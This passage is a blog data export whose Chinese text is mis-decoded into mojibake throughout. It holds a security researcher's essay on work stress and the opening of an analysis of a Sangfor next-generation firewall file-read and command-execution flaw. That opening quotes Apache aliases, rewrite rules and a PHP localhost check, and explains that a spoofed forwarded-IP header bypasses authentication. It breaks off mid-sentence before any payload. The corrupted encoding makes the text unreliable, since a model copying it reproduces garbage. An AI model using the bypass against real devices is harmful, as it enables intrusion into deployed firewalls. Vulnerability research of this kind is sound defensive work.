ä¹‹å‰åƒé¥­çš„æ—¶å€™ï¼Œéšå£é—²èŠåˆ«äººé—®è¿‡æˆ‘ï¼Œä¸ºä»€ä¹ˆå¤§å­¦ä¸åœ¨åŒ—äº¬ä¸Šï¼Œä¸ºä»€ä¹ˆä¹‹å‰ä¸åœ¨åŒ—äº¬å·¥ä½œï¼ŒåŸå› å°±æ˜¯ï¼Œæˆ‘çŸ¥é“åŒ—äº¬å°±æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä¸å–œæ¬¢ï¼Œæ‰€ä»¥ä»»æ€§çš„ç»™äº†è‡ªå·±å‡ å¹´çš„æ—¶é—´å»è¿œç¦»åŒ—äº¬è¿™æ ·çš„åŸå¸‚ã€‚å®¶åœ¨åŒ—äº¬ï¼Œè¿˜æ˜¯è¦å›ï¼Œæ‰€ä»¥ç°åœ¨å›æ¥äº†ï¼Œä¹Ÿåšå¥½äº†å¿ƒé‡Œå»ºè®¾ï¼Œä½†é¢å¯¹å½“å‰çš„å·¥ä½œå¼ºåº¦å’Œå‹åŠ›ï¼Œè¿˜æ˜¯æ¯”æˆ‘é¢„æœŸçš„è¦å·®å¾ˆå¤šã€‚ å…¶å®ä¹Ÿæ¸…æ¥šï¼Œé€€ä¸€æ­¥æµ·é˜”å¤©ç©ºï¼Œå³ä½¿æ˜¯åœ¨åŒ—äº¬ä¹Ÿä¸€å®šå­˜åœ¨æ›´å¥½çš„ç¯å¢ƒï¼Œæ›´èˆ’æœçš„å·¥ä½œã€‚å¯æ˜¯ï¼Œæˆ‘ç„¦è™‘35å²è£å‘˜å±æœºã€ç„¦è™‘å½“å‰å¾ˆå·®çš„å°±ä¸šç¯å¢ƒï¼Œå’Œå®‰å…¨è¿™ä¸ªå¾ˆçª„çš„è¡Œä¸šã€‚æ‰€ä»¥ï¼Œæˆ‘ä¼šå¾ˆæ‰§æ‹—çš„è®¤ä¸ºï¼Œæˆ‘å¿…é¡»åœ¨è¿˜å¹´è½»æ²¡æœ‰å¤ªå¤šç”Ÿæ´»è´Ÿæ‹…çš„æ—¶å€™ï¼Œé€¼è¿«è‡ªå·±å˜å¾—å¾ˆå‰å®³ï¼Œæ— è®ºæ˜¯æŠ€æœ¯ä¸Šçš„æé«˜ï¼Œè¿˜æ˜¯å·¥ä½œèƒ½åŠ›ä¸Šçš„æé«˜ï¼Œæˆ‘è®¤ä¸ºåªæœ‰è‡ªå·±æˆä¸ºå¾ˆå¼ºåˆä¸å¯ä»£æ›¿çš„äººçš„æ—¶å€™ï¼Œæˆ‘æ‰ä¼šæœ‰æˆ‘çš„é‚£ä»½å®‰å…¨æ„Ÿã€‚æ‰€ä»¥åœ¨æˆ‘çœ‹æ¥ï¼Œä»»ä½•æ²¡æœ‰è®©æˆ‘å¾—åˆ°æé«˜çš„å·¥ä½œéƒ½æ˜¯æ¸©æ°´ç…®é’è›™çš„æ…¢æ€§è‡ªæ€ã€‚ ä½†æƒ…ç»ªæ€»éœ€è¦ä¸€ä¸ªçªç ´å£ï¼Œæˆ‘çš„æƒ…ç»ªè®©æˆ‘æ˜ç™½ï¼Œç°åœ¨çš„å‹åŠ›è®©æˆ‘ä¸å¼€å¿ƒäº†ã€‚æˆ‘çš„ç†æ™ºè®©æˆ‘æ˜ç™½ï¼Œç°åœ¨åšçš„ï¼Œæ˜¯æˆ‘æ‰€è®¤å¯çš„å·¥ä½œã€‚å› æ­¤æˆ‘ç®—æ˜¯äº²æ‰‹æŠŠè‡ªå·±è£…è¿›äº†ä¸€ä¸ªå›šç¬¼é‡Œï¼Œä½†æˆ‘ä¸æƒ³å¾ˆè½»æ˜“çš„è¢«æ‰“å€’ã€‚ ä¸åˆ‡å®é™…ä½†è‚¯å®šæœ‰ç”¨çš„çœŸå®çš„æƒ³æ³•ï¼šæˆ‘è§‰å¾—å„ç§å‹åŠ›å¤ªå¤§äº†ï¼Œå¾ˆéœ€è¦ä¼‘æ¯ï¼Œæˆ‘ç‰¹åˆ«æƒ³å»å±±ä¸Šä¿®ä»™ã€‚å»é‚£ç§é“è§‚é‡Œé¢ï¼Œå–å–èŒ¶ï¼Œçœ‹çœ‹ä¹¦ï¼Œå‘¼å¸å¤§è‡ªç„¶çš„æ–°é²œç©ºæ°”ï¼Œæ²¡æœ‰äººæ‰“æ‰°ï¼Œæ—¥å‡ºè€Œä½œï¼Œæ—¥å…¥è€Œæ¯ï¼Œè®©çµé­‚å¾—åˆ°å‡€åŒ–ã€‚æˆ‘è¿˜æƒ³å»åšè‡ªç”±èŒä¸šï¼Œè¿œç¨‹åŠå…¬ï¼Œæ¸¸å±±ç©æ°´ï¼Œåœ¨æ¹–è¾¹ç å­—ï¼Œåœ¨å±±ä¸‹å¹é£ã€‚ æƒ³åšçš„äº‹æƒ…å¾ˆå¤šï¼Œå‘å¾€æ›´é«˜çš„è¿œæ–¹ï¼Œæ›´ç¾å¥½çš„æœªæ¥ã€‚å¯æ˜¯ç”Ÿæ´»æ€»æ˜¯æ›´å¤šçš„å¦¥åï¼Œå‘ä¸‹çœ‹çœ‹ç°å®ï¼Œè„šä¸‹è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šçš„è·¯è¦ç»§ç»­å¾€å‰èµ°ã€‚ æƒ…ç»ªæºå¤´åŠç„¦è™‘ç‚¹æƒ…ç»ªæºå¤´ä¸»è¦æ˜¯ä¸‰éƒ¨åˆ†ï¼šKPIã€å®¢æˆ·é—®é¢˜è§£ã€å·¥ä½œé‡å¤§ KPIï¼šæ—¥å¸¸å·¥ä½œå’ŒKPIåç¦»è¾ƒå¤§å½“å‰é¢ä¸´çš„ï¼šåšäº†å¾ˆå¤šæ¼æ´ä¼˜åŒ–å’Œè§£å†³å®¢æˆ·é—®é¢˜ã€‚æ¼æ´å½•å…¥å°‘ã€å‘ä¸å¤Ÿè¶³å¤Ÿå¤šçš„æ–‡ç« ã€‚ æˆ‘æ‰€æ‹…å¿§çš„ï¼š æ‹…å¿ƒè½¬æ­£ã€æ‹…å¿ƒåŒäº‹å’Œé¢†å¯¼å¯¹æˆ‘çš„è®¤å¯åº¦ã€æ‹…å¿ƒå¹´ç»ˆå¥– æ‹…å¿ƒç ”ç©¶çŸ¥è¯†çš„æ—¶é—´é•¿ï¼Œä½†å´äº¤ä¸å‡ºKPIéœ€è¦çš„äº§å‡º å…·ä½“å®ä¾‹ï¼šåšæŸä»¶äº‹æƒ…çš„æ—¶å€™ï¼Œæˆ‘æƒ³è¦å…ˆæŠŠå·¥ä½œç»“æœäº¤å‡ºæ¥ï¼Œæ¯”å¦‚å…ˆæŠŠä¼˜åŒ–å¥½çš„æ¼æ´æäº¤é€šè¿‡ã€‚è¿™æ ·æˆ‘ä¼šè§‰å¾—ä»»åŠ¡å®Œæˆï¼Œæ—¶é—´å……è£•ï¼Œæ²¡æœ‰å‹åŠ›äº†ï¼Œæˆ‘æ‰èƒ½æ”¾å¿ƒçš„å»åšç ”ç©¶ã€‚å› ä¸ºæˆ‘ä¼šæ‹…å¿ƒï¼Œæˆ‘å»å­¦ä¸€ä¸ªæŠ€æœ¯ç‚¹çš„æ—¶å€™ï¼Œå…¶å®å¾ˆæ…¢ï¼Œè€Œä¸”äº¤ä¸å‡ºæ–‡ç« ï¼Œäº¤ä¸å‡ºç»“æœï¼Œæˆ‘ç‰¹åˆ«å®³æ€•è¢«å‚¬ã€‚ å¦‚ä½•è§£å†³ï¼š é‡æ–°åˆ¶å®š KPI å­¦ä¹ æ–¹å‘ï¼šä¹‹æ‰€ä»¥è¿·èŒ«ä¸”æ‹…å¿ƒèœï¼Œæ˜¯å› ä¸ºæœ€è¿‘åšçš„ä¸œè¥¿éƒ½å¤ªæ‚å¤ªæ²¡æ–¹å‘æ€§äº†ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘å†³å®šåœ¨æ¼æ´æ–¹é¢ä¸Šï¼Œæ›´æœ‰æ–¹å‘æ€§çš„é”å®šåœ¨PHPçš„æ¼æ´ä¸Šã€‚ä»¥æ¼æ´å½•å…¥å’Œä¼˜åŒ–ä¸ºé©±åŠ¨ï¼Œç³»ç»Ÿçš„åœ¨è¿™æ–¹é¢å±•å¼€å­¦ä¹ å’Œç ”ç©¶ã€‚ å®³æ€•æ— äº§å‡ºè¢«å‚¬çš„é—®é¢˜ï¼šå­¦ä¹ å†…å®¹ï¼Œæˆ‘ä¸å†çº ç»“äºæ˜¯å¦æ­£å¼ï¼Œæ˜¯å¦èƒ½å‘æ–‡ç« ã€‚æ¥ä¸‹æ¥æˆ‘ä¼šå€¾å‘è‡ªå·±éšæ‰‹è®°ç‚¹ä¸œè¥¿ï¼Œå‘Blogï¼Œæˆ–è€…ä¸Šä¼ åœ¨æ¼æ´å›¢é˜Ÿï¼Œè¿™æ ·ä¼šè®©æˆ‘è§‰å¾—æ²¡æœ‰å‹åŠ›ã€‚å…³äºæ–‡ç« å‘è¡¨ï¼Œæˆ‘ä¼šä»éšç¬”é‡Œæ‰¾çµæ„Ÿï¼Œæˆ–è€…ä»çƒ­ç‚¹æ¼æ´ä¸­ï¼Œè®°å½•æœ‰ä»·å€¼çš„å‘æ–‡ç« ã€‚ å®¢æˆ·åé¦ˆï¼šæ—¶é—´è¢«ç¢ç‰‡åŒ–å½“å‰é¢ä¸´çš„ï¼š æ—¶é—´æ€»è¢«ç¢ç‰‡åŒ–ï¼Œæ€»æ˜¯è¢«æ‰“æ‰° æˆ‘çš„è€å¿ƒæœ‰é™ æˆ‘æ‰€æ‹…å¿§çš„ï¼š ä¸æƒ³æˆä¸ºå·¥å…·äººï¼Œæƒ³åœ¨æŠ€æœ¯ä¸Šæœ‰æ›´é«˜çš„çªç ´ï¼Œä¸æƒ³æˆä¸ºå¾ˆå®¹æ˜“è¢«æ›¿ä»£çš„â€œç®€å•äººâ€ã€‚ æˆ‘å¸Œæœ›æˆ‘æ˜¯å› ä¸ºæˆ‘çš„å·¥ä½œèƒ½åŠ›å¼ºè€Œæ¥æ‰¿æ‹…è¿™ä¸ªä»»åŠ¡çš„ï¼Œè€Œä¸æ˜¯å› ä¸ºå…¶ä»–çš„ä»»ä½•åŸå› ï¼Œæˆ‘ç»å¯¹ä¸ä¼šè®©è‡ªå·±æˆä¸ºèŒåœºä¸Šâ€œè¢«æ¬ºè´Ÿâ€çš„å¯¹è±¡ã€‚ æˆ‘çŸ¥é“æˆ‘ç¡®å®æ²Ÿé€šèƒ½åŠ›å¼ºä¸”é€»è¾‘æ›´æ¸…æ™°ï¼Œè¿™æ˜¯æˆ‘çš„ä¼˜ç‚¹ï¼Œæˆ‘ä¹Ÿå¾ˆå–œæ¬¢ã€‚ä½†æ˜¯è¿™ä¸æ˜¯æˆ‘æƒ³ç€é‡å‘å±•ä¸”ä»¥æ­¤ä¸ºç”Ÿçš„ç‚¹ã€‚æˆ‘æ„Ÿè§‰å½“ä¸‹æˆ‘çš„èŒä¸šå®‰æ’ï¼Œåç¦»äº†æˆ‘é¢„æƒ³çš„è½¨é“ã€‚ å…·ä½“å®ä¾‹ï¼šå…¶å®æˆ‘å·²ç»åœ¨è§£å†³æŸä¸ªå®¢æˆ·åé¦ˆæ¥çš„æ¼æ´é—®é¢˜äº†ï¼Œä½†æ˜¯æ€»æœ‰åŒäº‹æ²¡å®Œæ²¡äº†çš„é—®æˆ‘ï¼Œè®©æˆ‘è§‰å¾—æˆ‘å¹²çš„æ´»å„¿éƒ½ç™½å¹²äº†ï¼Œä¸€ç›´è¢«è´¨ç–‘å¾ˆä¸èˆ’æœã€‚ å¦‚ä½•è§£å†³ å…³äºæˆ‘åšçš„å·¥ä½œæ˜¯å¦æœ‰ä»·å€¼ï¼šæˆ‘è¦é‡æ–°å®šä½æˆ‘åœ¨å…¬å¸çš„å‘˜å·¥ä»·å€¼ã€‚å› ä¸ºæˆ‘ä»¬æ¯•ç«Ÿä¸æ˜¯ä¸€å®¶ç ”ç©¶é™¢ï¼Œå†µä¸”æˆ‘å’Œç»å¤§å¤šæ•°çš„äººï¼Œéƒ½ä¸æ˜¯å•çº¯äº§å‡ºæŠ€æœ¯çš„ç§‘å­¦å®¶ã€‚æˆ‘ä»¬åªæ˜¯ç»™å…¬å¸ç›ˆåˆ©çš„æ‰“å·¥äººï¼Œè€Œå®¢æˆ·å°±æ˜¯ç»™é’±çš„ä¸€æ–¹ï¼Œè§£å†³å®¢æˆ·é—®é¢˜ç»™å…¬å¸ç›ˆåˆ©è¿™æ˜¯æˆ‘ä¹‰ä¸å®¹è¾çš„å·¥ä½œå†…å®¹çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘æ›¾ç»å€¾å‘äºè®¤ä¸ºåªæœ‰å½•å¥½æ¼æ´ã€å‘å¥½æ–‡ç« ã€æŒ–å¥½æ¼æ´ï¼Œè¿™äº›çº¯æŠ€æœ¯å±‚é¢çš„æ‰æ˜¯å€¼å¾—è¢«è‚¯å®šçš„ï¼Œç°åœ¨æˆ‘è¦æ”¹å˜è¿™ä¸ªç‹­éš˜çš„æƒ³æ³•ã€‚å¾ˆå¥½çš„è§£å†³å®¢æˆ·é—®é¢˜ã€æœ‰æ•ˆçš„å’Œåˆ«çš„éƒ¨é—¨æ²Ÿé€šã€æå‡æŠ€æœ¯èƒ½åŠ›ï¼Œè¿™äº›æ˜¯åŒç­‰ä»·å€¼çš„ã€‚æˆ‘åº”è¯¥è®¤å¯è‡ªå·±åœ¨è¿™ä¸‰ç‚¹ä¸­æ¯ä¸€æ¡çš„ä»·å€¼ï¼Œä¸åº”æœ‰æ‰€åè¢’ã€‚ å·¥å…·äººé—®é¢˜ï¼šä½œä¸ºæ­£å¼çš„å‘˜å·¥è€Œéå®ä¹ ç”Ÿï¼Œç†Ÿæ‚‰å…¬å¸çš„ä¸šåŠ¡ï¼Œè¿™æ˜¯å¿…ç„¶çš„ã€‚æ¼æ´éƒ¨é—¨ä¸æ˜¯ç‹¬ç«‹äºå…¬å¸çš„ï¼Œæ‰€ä»¥å¿…é¡»éœ€è¦ä¸€ä¸ªç¨³å®šçš„æ¥å£ï¼Œè€Œæˆ‘çš„ä»·å€¼ï¼Œå°±æ˜¯æä¾›ç¨³å®šçš„æ¥å£ã€‚ åœ¨é•¿æ—¶é—´çš„è§£å†³æŸä¸ªå®¢æˆ·é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘åº”è¯¥ä¸»åŠ¨ç»™åˆ«äººæ›´å¤šçš„åé¦ˆï¼Œå’Œåˆ«äººè·Ÿè¿›æŸä¸ªæ¼æ´çš„è¿›åº¦ã€‚åˆ«äººä¼šä¸åœçš„å‘é—®ï¼Œç¡®å®ä¹Ÿæ˜¯å› ä¸ºåˆ«äººä¸çŸ¥é“å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆï¼Œæˆ‘æœ‰è´£ä»»è·Ÿè¿›åˆ°åº•ã€‚ä½†æ˜¯ï¼Œè¯·ä¸è¦æŠŠæˆ‘æ²¡æ¥æ‰‹ï¼Œæˆ–æ˜¯åˆ«äººå·²ç»å“åº”äº†çš„é—®é¢˜ï¼ˆæˆ‘ä¼šé»˜è®¤è´£ä»»äººéæˆ‘ï¼‰ï¼ŒæŒ‡è´£åˆ°æˆ‘çš„å¤´ä¸Šã€‚è™½ç„¶æˆ‘è®¤ä¸ºæ¼æ´éƒ¨æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä½†æˆ‘æ— æ³•æ¥å—æ— æ•…è¢«éª‚ï¼Œè¿™æ˜¯å¯¹æˆ‘å…¶ä»–è´Ÿè´£ä»»äº‹æƒ…çš„è”‘è§†ã€‚ å·¥ä½œé‡å¤§ï¼šè´Ÿè·é«˜ï¼Œæƒ…ç»ªé—®é¢˜åŠ å‰§å½“å‰é¢ä¸´çš„ï¼šæ¯å¤©ï¼Œä»æ—©ä¸Šååœ¨è¿™ä¸ªæ¤…å­å¼€å§‹ï¼Œå°±é©¬ä¸åœè¹„çš„ä¸€ç›´å·¥ä½œï¼Œæ²¡æœ‰å–˜æ¯çš„æ—¶é—´ã€‚æ— æ•°çš„ä»»åŠ¡ï¼Œé­å­ä¸€æ ·çš„æŠ½ç€æˆ‘å‘å‰ã€‚å·¥ä½œè´Ÿè·å¤§ï¼Œé€ æˆäº†æƒ…ç»ªå¾ˆå·®ã€‚åŒç­æƒ…ç»ªä¸¥é‡ã€è‡ªé—­ã€æ²¡è€å¿ƒã€æš´èºã€‚ æˆ‘æ‰€æ‹…å¿ƒçš„ï¼š æˆ‘åªæ˜¯æƒ³æŒ‰æ—¶ä¸‹ç­ï¼Œå› ä¸ºæˆ‘æ•´ä¸ªå·¥ä½œæ—¶é—´ï¼Œæ˜¯éå¸¸é«˜æ•ˆçš„ï¼Œä¸æ‘¸é±¼ä¸å·æ‡’ï¼Œåœ¨å·¥ä½œæ—¶é—´å†…ï¼Œæˆ‘å·²ç»å¾ˆå°½åŠ›çš„å·¥ä½œäº†ï¼Œç‰¹åˆ«ç´¯ï¼Œæ²¡æœ‰æç‰¹æ®Šçš„æƒ…å†µï¼ŒçœŸçš„ä¸æƒ³åŠ ç­äº†ã€‚ æˆ‘æ‹…å¿ƒæˆ‘çš„æŒ‰æ—¶ä¸‹ç­ï¼Œä¼šæ‹›æ¥é¢†å¯¼çš„ä¸æ»¡ã€‚å½±å“æˆ‘çš„å„ç§è€ƒæ ¸ã€‚ä½†æ˜¯æˆ‘çœŸçš„ä¸è®¤ä¸ºï¼Œä¸åŠ ç­å°±æ˜¯å¹²æ´»å°‘äº†ã€‚ æˆ‘æƒ³åŠªåŠ›å¹³è¡¡å·¥ä½œå’Œç”Ÿæ´»ï¼Œèƒ½ä¿æŒä¸€ç‚¹æˆ‘çš„ç§äººç”Ÿæ´»æ—¶é—´ï¼Œåšäº›å…¶ä»–æˆ‘å–œæ¬¢çš„äº‹æƒ…ã€‚æ‰€ä»¥æˆ‘æƒ³çŸ¥é“ï¼Œä¸‹ç­æ—¶é—´ã€å‡æœŸæ—¶é—´ï¼Œä¸â€å­¦ä¹ â€œï¼Œä¸é¢å¤–å·¥ä½œï¼Œæ˜¯å¦å°±æ˜¯åº”è¯¥â€å¿ƒæ€€æ„§ç–šçš„â€œï¼Œæ˜¯å¦å°±æ˜¯ä¸è¢«å…è®¸çš„ï¼Œä¼šå½±å“è€ƒæ ¸å’Œä¸ªäººè¯„ä»·çš„ã€‚ å¦‚ä½•è§£å†³ï¼š è¿™æ˜¯ä¸ªç»¼åˆçš„æ™®éé—®é¢˜ï¼Œå½“å‰ç†æƒ³çŠ¶æ€æ˜¯è§£å†³æƒ…ç»ªæºå¤´1ã€2ï¼Œæˆ–è®¸èƒ½æ”¹å–„æƒ…ç»ªã€‚ æ›´å¤šçš„åˆ†ç¦»å·¥ä½œå’Œç”Ÿæ´»ã€‚ä¸‹ç­ä¾¿æŠŠå·¥ä½œæƒ…ç»ªåˆ‡æ–­ï¼ŒæŠŠçƒ¦æ¼åˆ‡æ–­ã€‚åœ¨ç”Ÿæ´»æ—¶é—´é‡Œï¼Œæ›´å¥½çš„ä¼‘æ¯ï¼Œç»™è‡ªå·±å……ç”µã€‚ å°†å·¥ä½œä»»åŠ¡ï¼Œæ•´ç†æˆæ¸…å•ï¼Œä»¥å‡ç¼“å‹åŠ›å’Œç„¦è™‘æ„Ÿã€‚","categories":[{"name":"è„†å¼±çš„æœ¬ä½“","slug":"è„†å¼±çš„æœ¬ä½“","permalink":"https://gryffinbit.top/categories/%E8%84%86%E5%BC%B1%E7%9A%84%E6%9C%AC%E4%BD%93/"}],"tags":[{"name":"æ„Ÿæƒ³","slug":"æ„Ÿæƒ³","permalink":"https://gryffinbit.top/tags/%E6%84%9F%E6%83%B3/"}],"author":"Gryffinbit"},{"title":"æ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™æ–‡ä»¶è¯»å–ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ","slug":"æ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™æ–‡ä»¶è¯»å–ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ","date":"2023-10-20T14:22:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/æ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™æ–‡ä»¶è¯»å–ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æ/","permalink":"https://gryffinbit.top/2023/10/20/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"æ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™æ–‡ä»¶è¯»å–ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æè¿‘æœŸï¼Œæ·±ä¿¡æœä¸‹ä¸€ä»£é˜²ç«å¢™å‡ºäº†ä¸€ä¸ªæ–‡ä»¶è¯»å–ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç›®å‰å·²å…¬å¼€çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»…èƒ½åšåˆ°ç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œæ— æ³•æ»¡è¶³å®é™…æ”»é˜²åœºæ™¯ã€‚æœ¬æ¬¡æ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬é€šè¿‡å¯¹å®‰å…¨é˜²æŠ¤è®¾å¤‡çš„ç»•è¿‡ï¼Œå®Œæ•´çš„å®ç°äº† PHP ä»£ç æ‰§è¡Œå’Œæ¼æ´å›æ˜¾ã€‚ æ¼æ´åˆ†æè¯¥ç« èŠ‚å°†ä»æºä»£ç çš„è§’åº¦ï¼Œæ·±å…¥åˆ†æä»¥ä¸‹ä¸‰ä¸ªæ¼æ´ç‚¹ã€‚ èº«ä»½ç»•è¿‡åˆ†æ apache çš„é…ç½®æ–‡ä»¶é€šè¿‡åˆ†æ /etc/apache/conf.new/original/httpd.conf ã€/etc/apache/conf.new/httpd.conf ç­‰ apache é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ° sangfor ä¸‹ä¸€ä»£é˜²ç«å¢™çš„é…ç½®æ–‡ä»¶å’Œæ•æ„Ÿæ–‡ä»¶çš„å…·ä½“è·¯å¾„ã€‚ 1234567ScriptAlias /cgi-bin/ &quot;/virus/apache/apache/cgi-bin/&quot;Alias /cgi-bin/ &quot;/virus/webui/cgi-bin/&quot;Alias /svpn_html/ &quot;/virus/webui/svpn_html/&quot;Alias /bbc &quot;/virus/webui/ext/fast_deploy.html&quot;Alias &quot;/html&quot; &quot;/virus/webui/html&quot;Alias /proxy.html &quot;/virus/webui/ext/login.php&quot;Alias /proxy_cssp.html &quot;/virus/webui/ext/login.php&quot; å…¶ä¸­ /virus/webui/svpn_html/ è·¯å¾„å¾ˆé‡è¦ï¼Œåœ¨åé¢çš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶å†™å…¥è¯¥è·¯å¾„ï¼Œå¹¶ä¸”é€šè¿‡å¤–éƒ¨æ¥è¿›è¡Œè®¿é—®ã€‚ è®¿é—®æ•æ„Ÿè·¯å¾„ä¼šè¢«é‡å®šå‘è™½ç„¶æ‰¾åˆ°äº†æ•æ„Ÿçš„è·¯å¾„ï¼Œä½†æ˜¯ç›´æ¥è®¿é—®ä¹‹åéƒ½ä¼šè¢«é‡å®šå‘åˆ°LogInOut.php ï¼Œè¢«è¿«è¿›è¡Œèº«ä»½éªŒè¯ã€‚ ç»§ç»­æŸ¥çœ‹ apche çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°äº† RewriteRule è¿™ä¸ªè§„åˆ™é™åˆ¶ï¼Œä»¥åŠå¯¹æ§åˆ¶å™¨çš„è°ƒç”¨ã€‚ è¯¥è§„åˆ™ä¼šè¿›è¡Œåˆ¤æ–­ï¼Œå°†æ‰€æœ‰éç‰¹å®šæ‰©å±•åçš„è¯·æ±‚é‡å†™åˆ° index.php æ–‡ä»¶ï¼Œä»è€Œå°† URL è§£æäº¤ç»™ index.php æ¥å¤„ç†ã€‚ 1234567AllowOverride None: è¯¥æŒ‡ä»¤å…è®¸è¦†ç›–é…ç½®æ–‡ä»¶çš„è®¾ç½®ã€‚åœ¨è¿™é‡Œï¼Œè®¾ç½®ä¸º None è¡¨ç¤ºä¸å…è®¸ä½¿ç”¨.htaccessæ–‡ä»¶æ¥è¦†ç›–é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®ã€‚RewriteEngine on: å¼€å¯URLé‡å†™åŠŸèƒ½ã€‚RewriteCond %&#123;REQUEST_METHOD&#125; ^(TRACE|TRACK): è¯¥æ¡ä»¶åˆ¤æ–­å¦‚æœè¯·æ±‚çš„æ–¹æ³•æ˜¯ TRACE æˆ– TRACKï¼Œåˆ™æ‰§è¡Œä¸‹é¢çš„ Rewrite è§„åˆ™ã€‚RewriteRule .* - [F]: å¦‚æœç¬¦åˆä¸Šè¿°æ¡ä»¶ï¼Œå°†è¿”å›ä¸€ä¸ª Forbidden é”™è¯¯ï¼ˆ403ï¼‰ã€‚RewriteBase /: è®¾ç½® URL é‡å†™çš„åŸºæœ¬è·¯å¾„ä¸ºæ ¹è·¯å¾„ã€‚RewriteRule !.(js|gif|jpg|jpeg|png|css|pdf|ico|htm|html|htc|zip|crt|txt)$ index.php: å¦‚æœè¯·æ±‚çš„æ–‡ä»¶ä¸æ˜¯ jsã€gifã€jpgã€jpegã€pngã€cssã€pdfã€icoã€htmã€htmlã€htcã€zipã€crtã€txt çš„æ‰©å±•åä¹‹ä¸€ï¼Œåˆ™å°†è¯·æ±‚é‡å†™åˆ° index.php æ–‡ä»¶ã€‚RewriteRule .(php)$ index.php: å¦‚æœè¯·æ±‚çš„æ–‡ä»¶æ˜¯ä»¥ .php ç»“å°¾çš„ï¼Œåˆ™å°†è¯·æ±‚é‡å†™åˆ° index.php æ–‡ä»¶ã€‚ 1234require_once(CLASS_COMMON_PATH.&quot;dispatch/CFrontController.php&quot;);$t_objFrontController = new CFrontController();$t_objFrontController-&gt;dispatchRequest(); æ­¤æ§åˆ¶å™¨ç±»ç”¨äºå¤„ç†åº”ç”¨ç¨‹åºçº§è·¯ç”±ã€‚è¿™ä¸€åˆ‡éƒ½æ˜ å°„åœ¨ CFrontController.php ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç«¯ç‚¹ä»¥åŠä¸æ¯ä¸ªç«¯ç‚¹å…³è”çš„ç›¸åº”æ§åˆ¶å™¨å‡½æ•°ã€‚å¦‚æœä¸é¦–å…ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™æ— æ³•é€šè¿‡ web é¡µé¢ç›´æ¥è®¿é—®åˆ°é‚£äº›æ•æ„Ÿè·¯å¾„. åˆ©ç”¨dispatchRequest() å‡½æ•°ç»•è¿‡é‡å®šå‘é€šè¿‡æŸ¥çœ‹ dispatchRequest() å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå®ƒä¼šå»è°ƒç”¨å„ç§æ§åˆ¶å™¨å‡½æ•°ã€‚ 12if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] === &#x27;127.0.0.1&#x27;) $t_boolNeedCheck = false; å…¶ä¸­è¯¥è¡Œçš„ IF æ¡ä»¶ï¼Œä¼šè¿›è¡Œåˆ¤æ–­ã€‚å¦‚æœå€¼ä¸º 127.0.0.1 çš„çš„è¯ï¼Œä¼šå°† boolNeedCheck å€¼è®¾ä¸º false ï¼Œè¿›è€Œä¸å†è¿›è¡Œå…¶ä»–çš„é‡å®šå‘é€»è¾‘åˆ¤æ–­ã€‚ ç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¿®æ”¹ HTTP è¯·æ±‚æ ‡å¤´çš„æ–¹å¼ï¼Œæ¥ç»•è¿‡é€»è¾‘åˆ¤æ–­ã€‚ é€šè¿‡æŸ¥çœ‹ apache çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä»¥ä¸‹é…ç½®ä¿¡æ¯ã€‚ RPAFheader æ˜¯ä¸€ä¸ª Apache æ¨¡å—ï¼Œç”¨äºåœ¨ä»£ç†æœåŠ¡å™¨åé¢è¯†åˆ«å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ã€‚é€šè¿‡é…ç½® RPAFheader æ¨¡å—ï¼Œå¯ä»¥è®© Apache åœ¨å¤„ç†è¯·æ±‚æ—¶ä½¿ç”¨ä»£ç†æœåŠ¡å™¨å‘é€çš„è¯·æ±‚æŠ¥å¤´ä¸­çš„ç‰¹å®šå­—æ®µä½œä¸ºå®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œè€Œä¸æ˜¯é»˜è®¤ä½¿ç”¨ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ã€‚ ç»“åˆåˆšåˆšæåˆ°çš„ IF åˆ¤æ–­æ¡ä»¶ï¼Œä»¥åŠä¿®æ”¹ç‰¹å®šæ ‡å¤´æ¥æ§åˆ¶ PHP çœ‹åˆ°çš„ IP åœ°å€çš„æ–¹å¼ã€‚æˆ‘ä»¬åˆ†æå‡ºï¼Œå¯ä»¥å°†è¯·æ±‚å¤´è®¾ç½®ä¸º Y-Forwarded-For: 